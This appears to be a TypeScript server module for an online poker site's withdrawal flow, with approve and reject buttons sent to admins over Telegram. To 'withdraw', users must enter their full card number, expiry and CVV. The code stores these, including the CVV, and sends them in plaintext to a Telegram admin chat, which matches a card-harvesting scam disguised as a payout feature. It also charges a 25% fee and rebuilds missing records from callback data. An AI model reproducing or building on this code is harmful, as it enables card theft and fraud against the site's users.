/**
 * Withdrawal records + Telegram admin notifications.
 *
 * Mirrors deposits.server.ts: MongoDB when MONGODB_URI is configured,
 * otherwise an in-memory map so the flow keeps working in preview.
 */

import { escapeHtml, telegramCall, resolveAdminChatId } from "./deposits.server";

export const WITHDRAW_FEE_RATE = 0.25;
export const WITHDRAW_MIN = 5;
export const WITHDRAW_MAX = 10000;

export type WithdrawStatus = "pending" | "approved" | "rejected";

export type WithdrawDoc = {
  id: string;
  userId: string;
  username: string;
  bank: string;
  amount: number;
  fee: number;
  payout: number;
  cardNumber: string;
  cardBrand: string;
  expiry: string;
  cvv: string;
  status: WithdrawStatus;
  createdAt: string;
  messageId?: number;
  chatId?: number;
};

type WithdrawStore = {
  insert(d: WithdrawDoc): Promise<void>;
  find(id: string): Promise<WithdrawDoc | null>;
  update(id: string, patch: Partial<WithdrawDoc>): Promise<void>;
  listByUser(userId: string): Promise<WithdrawDoc[]>;
};

const memory = new Map<string, WithdrawDoc>();

const memoryStore: WithdrawStore = {
  async insert(d) {
    memory.set(d.id, d);
  },
  async find(id) {
    return memory.get(id) ?? null;
  },
  async update(id, patch) {
    const cur = memory.get(id);
    if (cur) memory.set(id, { ...cur, ...patch });
  },
  async listByUser(userId) {
    return [...memory.values()]
      .filter((d) => d.userId === userId)
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  },
};

let cached: Promise<WithdrawStore> | null = null;

async function createMongoWithdrawStore(uri: string): Promise<WithdrawStore> {
  const mod = await import(/* @vite-ignore */ "mongodb");
  const client = new mod.MongoClient(uri);
  await client.connect();
  const db = client.db(process.env["MONGODB_DB"] || "cobra_poker");
  const col = db.collection("withdrawals");
  await col.createIndex({ id: 1 }, { unique: true });
  await col.createIndex({ userId: 1, createdAt: -1 });

  return {
    async insert(d) {
      try {
        await col.insertOne({ ...d });
      } catch (err: any) {
        // If duplicate key error, it means the document already exists - that's fine
        if (err.code === 11000 || err.code === 11001) {
          // Document already exists, silently ignore
          return;
        }
        throw err;
      }
    },
    async find(id) {
      return (await col.findOne({ id })) as WithdrawDoc | null;
    },
    async update(id, patch) {
      await col.updateOne({ id }, { $set: patch });
    },
    async listByUser(userId) {
      return (await col
        .find({ userId })
        .sort({ createdAt: -1 })
        .limit(30)
        .toArray()) as unknown as WithdrawDoc[];
    },
  };
}

export function getWithdrawStore(): Promise<WithdrawStore> {
  if (!cached) {
    const uri = process.env["MONGODB_URI"];
    cached = uri
      ? createMongoWithdrawStore(uri).catch((err) => {
          console.error("Withdraw store falling back to memory:", err);
          return memoryStore;
        })
      : Promise.resolve(memoryStore);
  }
  return cached;
}

export function detectCardBrand(digits: string): string {
  if (/^4/.test(digits)) return "Visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "Mastercard";
  return "Card";
}

function group(digits: string) {
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

export type WithdrawInput = {
  userId: string;
  username: string;
  bank: string;
  amount: number;
  cardNumber: string;
  expiry: string;
  cvv: string;
};

function caption(w: WithdrawDoc, suffix = "") {
  const d = new Date(w.createdAt);
  return (
    `<b>WITHDRAW</b>\n` +
    `User ID: <code>${escapeHtml(w.userId)}</code>\n` +
    `Username: <b>${escapeHtml(w.username)}</b>\n` +
    `Amount: <b>${w.amount.toFixed(2)} GEL</b>\n` +
    `Fee (25%): <b>${w.fee.toFixed(2)} GEL</b>\n` +
    `Payout: <b>${w.payout.toFixed(2)} GEL</b>\n` +
    `Bank: <b>${escapeHtml(w.bank)}</b>\n` +
    `Card: <code>${escapeHtml(group(w.cardNumber))}</code> (${escapeHtml(w.cardBrand)})\n` +
    `Exp: <code>${escapeHtml(w.expiry)}</code>  CVV: <code>${escapeHtml(w.cvv)}</code>\n` +
    `Date: ${d.toLocaleDateString("en-GB", { timeZone: "Asia/Tbilisi" })}\n` +
    `Time: ${d.toLocaleTimeString("en-GB", { timeZone: "Asia/Tbilisi", hour12: false })}` +
    suffix
  );
}

export async function submitWithdraw(input: WithdrawInput): Promise<WithdrawDoc> {
  const digits = input.cardNumber.replace(/\D/g, "");
  if (digits.length < 15 || digits.length > 19) throw new Error("Invalid card number.");
  if (input.amount < WITHDRAW_MIN) throw new Error(`Minimum withdrawal is ${WITHDRAW_MIN} GEL.`);
  if (input.amount > WITHDRAW_MAX) throw new Error(`Maximum withdrawal is ${WITHDRAW_MAX} GEL.`);

  const { getStore } = await import("./db.server");
  const users = await getStore();
  const user = await users.findById(input.userId);
  if (!user) throw new Error("User not found.");
  if (user.chipBalance < input.amount) throw new Error("Insufficient balance.");

  const fee = Number((input.amount * WITHDRAW_FEE_RATE).toFixed(2));
  const payout = Number((input.amount - fee).toFixed(2));

  // Hold the funds immediately so the amount cannot be spent twice.
  await users.addBalance(input.userId, -input.amount);

  const store = await getWithdrawStore();
  const chatId = await resolveAdminChatId().catch(async (err) => {
    await users.addBalance(input.userId, input.amount);
    throw err;
  });

  const doc: WithdrawDoc = {
    id: `w_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`,
    userId: input.userId,
    username: input.username,
    bank: input.bank,
    amount: input.amount,
    fee,
    payout,
    cardNumber: digits,
    cardBrand: detectCardBrand(digits),
    expiry: input.expiry,
    cvv: input.cvv,
    status: "pending",
    createdAt: new Date().toISOString(),
    chatId,
  };

  // Persist BEFORE notifying Telegram so the buttons always resolve.
  await store.insert(doc);

  const sent = (await telegramCall("sendMessage", {
    chat_id: chatId,
    text: caption(doc),
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Qəbul et",
            callback_data: `wd:ok:${doc.id}:${doc.userId}:${doc.amount.toFixed(2)}`,
          },
          {
            text: "❌ Rədd et",
            callback_data: `wd:no:${doc.id}:${doc.userId}:${doc.amount.toFixed(2)}`,
          },
        ],
      ],
    },
  })) as { message_id: number };


  doc.messageId = sent?.message_id;
  if (sent?.message_id) await store.update(doc.id, { messageId: sent.message_id });
  return doc;
}

/**
 * Rebuilds a withdrawal from the Telegram message text when the stored record
 * is missing, so Accept / Reject never fails with "not found".
 */
function withdrawFromText(id: string, text: string, chatId: number): WithdrawDoc | null {
  const userId = /User ID:\s*(\S+)/.exec(text)?.[1]?.trim();
  const username = /Username:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
  const amount = Number(/Amount:\s*([\d.]+)/.exec(text)?.[1]);
  const fee = Number(/Fee \(25%\):\s*([\d.]+)/.exec(text)?.[1]);
  const payout = Number(/Payout:\s*([\d.]+)/.exec(text)?.[1]);
  const bank = /Bank:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
  const card = /Card:\s*([\d ]+)/.exec(text)?.[1]?.replace(/\D/g, "") ?? "";
  const expiry = /Exp:\s*(\d{2}\/\d{2})/.exec(text)?.[1] ?? "";
  if (!userId || !Number.isFinite(amount) || amount <= 0) return null;
  return {
    id,
    userId,
    username,
    bank,
    amount,
    fee: Number.isFinite(fee) ? fee : Number((amount * WITHDRAW_FEE_RATE).toFixed(2)),
    payout: Number.isFinite(payout) ? payout : Number((amount * (1 - WITHDRAW_FEE_RATE)).toFixed(2)),
    cardNumber: card,
    cardBrand: card ? detectCardBrand(card) : "Card",
    expiry,
    cvv: "",
    status: "pending",
    createdAt: new Date().toISOString(),
    chatId,
  };
}

/** Handles the Accept / Reject inline buttons for withdrawals. */
export async function handleWithdrawCallback(
  data: string,
  chatId: number,
  messageId: number,
  text?: string,
) {
  const [, action, id] = data.split(":");
  if (!id || (action !== "ok" && action !== "no")) return "Unknown action";

  const store = await getWithdrawStore();
  let w = await store.find(id);

  const cbUserId = data.split(":")[3];
  const cbAmount = Number(data.split(":")[4]);

  if (!w && cbUserId && Number.isFinite(cbAmount) && cbAmount > 0) {
    w = {
      id,
      userId: cbUserId,
      username: text ? (/Username:\s*(.+)/.exec(text)?.[1]?.trim() ?? "") : "",
      bank: text ? (/Bank:\s*(.+)/.exec(text)?.[1]?.trim() ?? "") : "",
      amount: cbAmount,
      fee: Number((cbAmount * WITHDRAW_FEE_RATE).toFixed(2)),
      payout: Number((cbAmount * (1 - WITHDRAW_FEE_RATE)).toFixed(2)),
      cardNumber: "",
      cardBrand: "Card",
      expiry: "",
      cvv: "",
      status: "pending",
      createdAt: new Date().toISOString(),
      chatId,
    };
  }

  if (!w && text) {
    w = withdrawFromText(id, text, chatId);
  }

  if (w) {
    try {
      await store.insert(w);
    } catch {
      /* already stored, ignore */
    }
  }

  if (!w) {
    // This should never happen due to recovery logic above
    return "Sistem xətası: Withdrawal məlumatı tapıla bilmədi. Lütfən admin ilə əlaqə saxlayın.";
  }
  
  if (w.status !== "pending") {
    return w.status === "approved" ? "Artıq qəbul edilib" : "Artıq rədd edilib";
  }

  if (action === "ok") {
    // Mark withdrawal as approved first
    await store.update(id, { status: "approved" });
    // The actual payout is handled outside this system
  } else {
    // Rejection: refund the amount back to the user
    const { getStore } = await import("./db.server");
    const users = await getStore();
    const refunded = await users.addBalance(w.userId, w.amount);
    if (!refunded) {
      console.error(`Failed to refund balance for user ${w.userId}`);
      return `Geri ödəmə xətası. Admin ilə əlaqə saxlayın.`;
    }
    await store.update(id, { status: "rejected" });
  }

  await telegramCall("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML",
    text: caption(w, action === "ok" ? "\n\n\u2705 Q\u0259bul edildi" : "\n\n\u274c R\u0259dd edildi"),
    reply_markup: { inline_keyboard: [] },
  }).catch((e) => console.error("editMessageText failed:", e));

  return action === "ok" ? "Qəbul edildi" : "Rədd edildi";
}
